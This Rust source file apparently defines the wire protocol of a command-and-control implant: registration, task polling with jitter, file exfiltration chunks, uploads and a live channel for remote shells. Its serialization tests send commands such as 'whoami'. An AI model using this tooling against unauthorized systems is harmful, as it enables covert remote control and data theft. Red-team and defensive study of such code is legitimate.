use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::control::CallbackCapabilities;

/// Sent inside a Register envelope (encrypted) by implant -> server.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Register {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub addr: String,
    #[serde(default)]
    pub os_version: Option<String>,
    #[serde(default)]
    pub executable_path: Option<String>,
    #[serde(default)]
    pub local_addr: Option<String>,
    #[serde(default)]
    pub implant_version: Option<String>,
    #[serde(default)]
    pub interval_ms: Option<u64>,
    #[serde(default)]
    pub jitter_ms: Option<u64>,
    #[serde(default)]
    pub capabilities: Option<CallbackCapabilities>,
    /// The AES-256 session key to use after handshake, base64. In a full-
    /// forward-secrecy build this is an x25519 public key; M1 uses a
    /// pre-shared profile key so this is the derived session key.
    pub session_key: String,
}

/// Encrypted response to Register: server confirms session id + its ephemeral
/// x25519 public key so the implant can derive the shared session key.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterAck {
    pub session_id: Uuid,
    /// Server's ephemeral x25519 public key, base64. The implant DH's this
    /// against its own ephemeral secret to derive the per-session key.
    pub server_pub: String,
}

/// A command to run. Sent server -> implant inside Task envelope.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Task {
    pub id: Uuid,
    pub command: String,
    pub args: Vec<String>,
    pub timeout_ms: u64,
}

/// Result of a Task. Sent implant -> server inside TaskResult envelope.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResult {
    pub task_id: Uuid,
    pub ok: bool,
    pub stdout: Vec<u8>,
    pub stderr: Vec<u8>,
    pub exit_code: i32,
}

/// One poll: implant reports completed result ids (already acked) and asks
/// for new tasks. File download chunks ride in the same request so a large
/// file streams over consecutive beacons (see the `nw/download` task).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PollRequest {
    pub results: Vec<TaskResult>,
    /// Legacy alias for accepted task ids. Kept for older implants/servers.
    #[serde(default)]
    pub acked_ids: Vec<Uuid>,
    /// Task ids accepted by the implant. The server advances only owned tasks.
    #[serde(default)]
    pub accepted_task_ids: Vec<Uuid>,
    /// Download chunks (implant -> server) for the active file transfer.
    pub file_chunks: Vec<FileChunk>,
    /// Confirmations (implant -> server) for the active server->implant upload.
    pub upload_acks: Vec<FileAck>,
    /// The implant's per-frame inner budget, so the server sizes upload pushes
    /// to fit the tightest (DNS) transport without overflow.
    pub inner_budget: usize,
}

/// Server reply to a poll: new tasks, download acks (resume points) for the
/// active download, and any server->implant upload chunks to write.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PollReply {
    pub tasks: Vec<Task>,
    /// Result ids durably stored by the server and safe to drop client-side.
    #[serde(default)]
    pub result_acks: Vec<Uuid>,
    pub acks: Vec<FileAck>,
    /// Upload chunks (server -> implant) for the active upload transfer.
    pub push_chunks: Vec<FileChunk>,
}

/// A frame the server writes straight to a connected implant.
///
/// These ride the live channel (a persistent WebSocket carrier) and never enter
/// the task queue: a `Kill` lands in one network round trip instead of behind
/// whatever work is already pending, and an attached shell is usable the moment
/// the operator types. If the carrier is not connected the frame is not queued
/// — the caller decides whether to fall back.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "op", rename_all = "snake_case")]
pub enum Live {
    /// Run one task now. Identical execution to a polled task, but the result
    /// still travels on the next beacon like every other task result.
    Task { task: Task },
    /// Stop one task immediately, whether it is queued, accepted or running.
    Kill { task_id: Uuid },
    /// Start an interactive shell under a server-chosen id.
    ShellOpen {
        shell_id: Uuid,
        program: String,
        args: Vec<String>,
    },
    /// Bytes the operator typed, verbatim (control characters included).
    ShellInput { shell_id: Uuid, data: String },
    /// Tear the shell (and its child) down.
    ShellClose { shell_id: Uuid },
}

/// What an implant writes to the server on the live channel without being polled.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "event", rename_all = "snake_case")]
pub enum LiveEvent {
    /// Echo of an accepted `Live::Kill`; `killed` is false when no matching
    /// task was running (it may have already finished).
    Killed { task_id: Uuid, killed: bool },
    /// The shell is running. `pty` reports whether the child got a real
    /// terminal (line editing, job control) or a pipe.
    ShellReady {
        shell_id: Uuid,
        program: String,
        pty: bool,
    },
    /// Shell output. `data` is base64 of the raw bytes so binary output and
    /// split multi-byte sequences survive JSON.
    ShellData {
        shell_id: Uuid,
        data: String,
        stderr: bool,
    },
    /// The shell process ended on its own.
    ShellExit { shell_id: Uuid, code: Option<i32> },
}

/// One chunk of a file streaming from the implant to the server.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChunk {
    /// Durable server-generated transfer identity. Absent only when decoding
    /// legacy peers; current transfer handlers reject a missing value.
    #[serde(default)]
    pub transfer_id: Option<Uuid>,
    /// Task that authorized this transfer. Absent only for legacy decoding.
    #[serde(default)]
    pub task_id: Option<Uuid>,
    /// Untrusted remote/display metadata supplied by the callback; never use
    /// this value as a local filesystem path or storage key.
    pub name: String,
    /// Absolute byte offset of this chunk in the file.
    pub offset: u64,
    /// Total source file size (set on every chunk for out-of-band info).
    pub total: u64,
    /// Raw chunk bytes.
    pub data: Vec<u8>,
}

/// Server -> implant progress on the active file transfer.
#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub struct FileAck {
    /// Transfer whose contiguous offset is acknowledged.
    #[serde(default)]
    pub transfer_id: Option<Uuid>,
    /// Highest contiguous byte offset the server has persisted for this file.
    pub received: u64,
    /// Total bytes the server expects (echoed from FileChunk.total).
    pub total: u64,
    /// True once received == total (server has the whole file).
    pub done: bool,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn messages_serialize() {
        let t = Task {
            id: Uuid::new_v4(),
            command: "whoami".into(),
            args: vec![],
            timeout_ms: 1000,
        };
        let j = serde_json::to_string(&t).unwrap();
        let back: Task = serde_json::from_str(&j).unwrap();
        assert_eq!(back.command, "whoami");
    }

    #[test]
    fn legacy_register_shape_deserializes_without_workspace_metadata() {
        let legacy = serde_json::json!({
            "hostname": "legacy-host",
            "username": "legacy-user",
            "os": "linux",
            "arch": "x86_64",
            "pid": 42,
            "addr": "10.0.0.8",
            "session_key": "legacy-key"
        });

        let register: Register = serde_json::from_value(legacy).unwrap();

        assert_eq!(register.hostname, "legacy-host");
        assert_eq!(register.addr, "10.0.0.8");
        assert!(register.os_version.is_none());
        assert!(register.executable_path.is_none());
        assert!(register.local_addr.is_none());
        assert!(register.implant_version.is_none());
        assert!(register.interval_ms.is_none());
        assert!(register.jitter_ms.is_none());
        assert!(register.capabilities.is_none());
    }

    #[test]
    fn legacy_polls_default_new_ack_fields() {
        let request: PollRequest = serde_json::from_str(
            r#"{"results":[],"acked_ids":[],"file_chunks":[],"upload_acks":[],"inner_budget":0}"#,
        )
        .unwrap();
        assert!(request.accepted_task_ids.is_empty());

        let reply: PollReply =
            serde_json::from_str(r#"{"tasks":[],"acks":[],"push_chunks":[]}"#).unwrap();
        assert!(reply.result_acks.is_empty());
    }

    #[test]
    fn live_channel_messages_round_trip() {
        use crate::msgs::{Live, LiveEvent};

        let task = Task {
            id: Uuid::new_v4(),
            command: "id".into(),
            args: vec!["-u".into()],
            timeout_ms: 30_000,
        };
        let frame = Live::Task { task: task.clone() };
        let encoded = serde_json::to_string(&frame).unwrap();
        assert!(encoded.contains(r#""op":"task""#), "{encoded}");
        assert_eq!(serde_json::from_str::<Live>(&encoded).unwrap(), frame);

        let kill = Live::Kill { task_id: task.id };
        let encoded = serde_json::to_string(&kill).unwrap();
        assert!(encoded.contains(r#""op":"kill""#), "{encoded}");
        assert_eq!(serde_json::from_str::<Live>(&encoded).unwrap(), kill);

        let input = Live::ShellInput {
            shell_id: Uuid::new_v4(),
            // Control characters an operator actually sends over a terminal.
            data: "id\rwhoami\u{3}".into(),
        };
        let encoded = serde_json::to_string(&input).unwrap();
        assert_eq!(serde_json::from_str::<Live>(&encoded).unwrap(), input);

        let shell_id = Uuid::new_v4();
        let event = LiveEvent::ShellData {
            shell_id,
            data: "cm9vdA==".into(),
            stderr: false,
        };
        let encoded = serde_json::to_string(&event).unwrap();
        assert!(encoded.contains(r#""event":"shell_data""#), "{encoded}");
        assert_eq!(serde_json::from_str::<LiveEvent>(&encoded).unwrap(), event);
    }

    /// A payload built before the live channel existed must not make the server
    /// send frames it cannot read: absent fields default, unknown variants fail.
    #[test]
    fn legacy_peers_never_see_a_live_frame_they_could_misread_as_a_poll() {
        use crate::msgs::{Live, LiveEvent};

        assert!(serde_json::from_str::<Live>(r#"{"op":"task"}"#).is_err());
        assert!(serde_json::from_str::<LiveEvent>(r#"{"event":"killed"}"#).is_err());
    }

    #[test]
    fn file_transfer_messages_round_trip_transfer_and_task_ids() {
        let transfer_id = Uuid::new_v4();
        let task_id = Uuid::new_v4();
        let chunk = FileChunk {
            transfer_id: Some(transfer_id),
            task_id: Some(task_id),
            name: "/srv/lab/artifact.bin".into(),
            offset: 1024,
            total: 3072,
            data: vec![7; 16],
        };
        let decoded: FileChunk =
            serde_json::from_slice(&serde_json::to_vec(&chunk).unwrap()).unwrap();
        assert_eq!(decoded.transfer_id, Some(transfer_id));
        assert_eq!(decoded.task_id, Some(task_id));

        let ack = FileAck {
            transfer_id: Some(transfer_id),
            received: 1040,
            total: 3072,
            done: false,
        };
        let decoded: FileAck = serde_json::from_slice(&serde_json::to_vec(&ack).unwrap()).unwrap();
        assert_eq!(decoded.transfer_id, Some(transfer_id));
    }

    #[test]
    fn legacy_file_transfer_messages_default_protocol_ids_to_none() {
        let chunk: FileChunk =
            serde_json::from_str(r#"{"name":"artifact.bin","offset":0,"total":3,"data":[1,2,3]}"#)
                .unwrap();
        assert_eq!(chunk.transfer_id, None);
        assert_eq!(chunk.task_id, None);

        let ack: FileAck = serde_json::from_str(r#"{"received":3,"total":3,"done":true}"#).unwrap();
        assert_eq!(ack.transfer_id, None);
    }
}
